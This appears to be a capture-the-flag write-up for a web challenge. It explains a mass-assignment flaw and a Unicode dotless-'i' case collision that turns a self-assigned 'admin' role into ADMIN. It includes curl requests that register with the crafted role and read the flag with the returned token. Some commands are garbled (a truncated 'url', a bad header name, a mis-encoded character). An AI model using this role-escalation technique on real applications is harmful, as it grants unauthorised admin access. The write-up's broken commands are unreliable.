Logging in to the cat site automatically gets the `user role`, it allows you to browse the cat site and post comments. However, the application has a vulnerability: Mass Assignment. This means that the role assignment is not checked and the user can change it.That is, by providing a session token we are able to overwrite our role. Read more [here](https://tcm-sec.com/exploiting-mass-assignment-vulnerabilities/)

```bash 
example solution


```
## Admin

However, with the second flag, i.e. changing the role from `user` to `admin`, the application has a dotless vulnerability. When you specify a new role as `adm覺n`, Unicode case collisions happen and it is read as `ADMIN`. More information [here](https://dev.to/jagracey/hacking-github-s-auth-with-unicode-s-turkish-dotless-i-460n)

```bash 
example solution
url --path-as-is -i -s -k -X $'POST' -H '$HOST: escatlate-52bc47e034fa.1753ctf.com' -H $'User-Agent: Im.cat' -H'Content-Type: application/json' -H $'Content-Lenght: 53' --data-binary $'{\"username\":\"fw\",\"password\":\"dupa\",\"role\":\"adm覺n\"}' $'https://escatlate-52bc47e034fa.1753ctf.com/api/register'
```
Then we can recive:
```bash
{"username":"fw","password":"dupa","token":"2b0b185cdbd08004698673d68697f262f2511ad8c446a98e2c058759aa4478e2","role":"adm覺n"}
```
so we can confirm our role now is `adm覺n` but app read this role as  `ADMIN` so we have admin righ. Now we can use our token to get flag:
```bash
curl --path-as-is -i -s -k -X $'GET' \
-H $'Host: escatlate-52bc47e034fa.1753ctf.com' -H $'User-Agent: Im.cat' -H $'X-Token: 2b0b185cdbd08004698673d68697f262f2511ad8c446a98e2c058759aa4478e2' \
$'https://escatlate-52bc47e034fa.1753ctf.com/api/message'

```
